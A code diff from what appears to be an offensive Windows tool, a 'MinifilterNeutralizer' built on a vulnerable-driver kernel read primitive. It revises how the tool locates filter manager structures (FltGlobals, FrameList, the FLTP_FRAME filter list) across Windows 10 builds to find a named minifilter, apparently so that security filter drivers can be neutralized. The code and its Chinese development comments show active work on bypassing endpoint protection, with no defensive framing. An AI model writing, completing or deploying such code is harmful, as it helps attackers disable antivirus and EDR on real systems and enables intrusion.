@@ -3114,38 +3114,17 @@ uint64_t MinifilterNeutralizer::FindFilterByName(uint64_t fltmgrBase, uint64_t f
     auto& kma = KernelMemoryAccessor::Instance();
     ByovdDiag("FLT:NTRL: finding filter '%ls'\n", name);
 
-    // FltGlobals → FrameList (FltGlobals + 0x000 → LIST_ENTRY / FLTP_FRAME*)
-    uint64_t frameList = 0;
-    if (!kma.ReadKernelVA(fltGlobals, &frameList, sizeof(frameList))) {
-        ByovdDiag("FLT:NTRL: cannot read FrameList from FltGlobals\n");
-        return 0;
-    }
-    // ★ BUILD 462: FrameList 通常在 fltmgr .data 内 (Win10早期),
-    //   但在 Win10 22H2+ 可能是动态分配的池地址 (如 0xFFFFF807E40F1000),
-    //   只要不是 null/user-space 就有效
-    if (!frameList || frameList < 0xFFFF800000000000ULL) {
-        ByovdDiag("FLT:NTRL: FrameList invalid 0x%llX\n", (unsigned long long)frameList);
-        return 0;
-    }
-
-    // BUILD 465: dump FltGlobals + FrameList hex 诊断
-    ByovdDiag("FLT:NTRL: FltGlobals hex: ");
+    // BUILD 466: FltGlobals 在 Win10 版本间布局不同
+    //   不再假设 FrameList 在 +0x00 — 尝试 fltGlobals 前 4 个 qword
+    uint64_t globQw[4] = {};
     for (int i = 0; i < 4; i++) {
-        uint64_t qw = 0;
-        kma.ReadKernelVA(fltGlobals + i*8, &qw, 8);
-        ByovdDiag("%016llX ", (unsigned long long)qw);
+        kma.ReadKernelVA(fltGlobals + i * 8, &globQw[i], 8);
     }
-    ByovdDiag("\n");
-    ByovdDiag("FLT:NTRL: FrameList at 0x%llX hex: ", (unsigned long long)frameList);
-    for (int i = 0; i < 8; i++) {
-        uint64_t qw = 0;
-        kma.ReadKernelVA(frameList + i*8, &qw, 8);
-        ByovdDiag("%016llX ", (unsigned long long)qw);
-    }
-    ByovdDiag("\n");
+    ByovdDiag("FLT:NTRL: FltGlobals hex: %016llX %016llX %016llX %016llX\n",
+        (unsigned long long)globQw[0], (unsigned long long)globQw[1],
+        (unsigned long long)globQw[2], (unsigned long long)globQw[3]);
 
-    // FLTP_FRAME.FilterList 偏移因 Windows 版本而异
-    // BUILD 465: 扩展扫描 FrameList 地址 0x100-0x400 全范围
+    // FLTP_FRAME.FilterList 偏移
     uint64_t filterOffsets[] = { 
         0x138, 0x140, 0x148, 0x150, 0x158, 0x160, 0x168, 0x170, 0x178, 0x180,
         0x188, 0x190, 0x198, 0x1A0, 0x1A8, 0x1B0, 0x1B8, 0x1C0, 0x1C8, 0x1D0,
@@ -3153,23 +3132,57 @@ uint64_t MinifilterNeutralizer::FindFilterByName(uint64_t fltmgrBase, uint64_t f
         0x228, 0x230, 0x238, 0x240, 0x248, 0x250, 0x258, 0x260, 0x268, 0x270,
         0x278, 0x280, 0x288, 0x290, 0x298, 0x2A0, 0x2A8, 0x2B0, 0x2B8, 0x2C0,
     };
-    uint64_t filterListHead = 0;
 
-    for (uint64_t off : filterOffsets) {
-        uint64_t addr = frameList + off;
-        uint64_t flink = 0, blink = 0;
-        if (kma.ReadKernelVA(addr, &flink, sizeof(flink)) &&
-            kma.ReadKernelVA(addr + 8, &blink, sizeof(blink))) {
-            if (flink != addr && flink > 0xFFFF800000000000ULL && blink > 0xFFFF800000000000ULL) {
-                filterListHead = addr;
-                ByovdDiag("FLT:NTRL: FilterList head at frame+0x%llX\n", off);
-                break;
+    uint64_t filterListHead = 0;
+    uint64_t frameList = 0;
+
+    // ★ BUILD 466: 尝试每个 qword 作为 FrameList 指针
+    for (int qi = 0; qi < 4 && !filterListHead; qi++) {
+        uint64_t candidateFrame = globQw[qi];
+        if (candidateFrame < 0xFFFF800000000000ULL) continue;
+
+        // 验证 candidateFrame 指向的数据是否有效
+        uint64_t firstQw = 0;
+        if (!kma.ReadKernelVA(candidateFrame, &firstQw, 8)) continue;
+        if (firstQw < 0xFFFF800000000000ULL) {
+            ByovdDiag("FLT:NTRL: qword[%d]=%016llX rejected (data not kernel ptr)\n",
+                qi, (unsigned long long)candidateFrame);
+            continue;
+        }
+
+        ByovdDiag("FLT:NTRL: try qword[%d]=%016llX as FrameList\n",
+            qi, (unsigned long long)candidateFrame);
+
+        for (uint64_t off : filterOffsets) {
+            uint64_t addr = candidateFrame + off;
+            uint64_t flink = 0, blink = 0;
+            if (kma.ReadKernelVA(addr, &flink, sizeof(flink)) &&
+                kma.ReadKernelVA(addr + 8, &blink, sizeof(blink))) {
+                if (flink != addr && flink > 0xFFFF800000000000ULL && blink > 0xFFFF800000000000ULL) {
+                    filterListHead = addr;
+                    frameList = candidateFrame;
+                    ByovdDiag("FLT:NTRL: FilterList at +0x%llX via qword[%d]\n", off, qi);
+                    break;
+                }
             }
         }
     }
 
     if (!filterListHead) {
-        ByovdDiag("FLT:NTRL: FilterList not found in FLTP_FRAME\n");
+        ByovdDiag("FLT:NTRL: FilterList not found in any frame candidate\n");
+
+        // 诊断: dump 每个候选的前 4 qword
+        for (int qi = 0; qi < 4; qi++) {
+            uint64_t cf = globQw[qi];
+            if (cf < 0xFFFF800000000000ULL) continue;
+            ByovdDiag("FLT:NTRL: frame[%d] hex: ", qi);
+            for (int j = 0; j < 4; j++) {
+                uint64_t qw = 0;
+                kma.ReadKernelVA(cf + j*8, &qw, 8);
+                ByovdDiag("%016llX ", (unsigned long long)qw);
+            }
+            ByovdDiag("\n");
+        }
         return 0;
     }
 
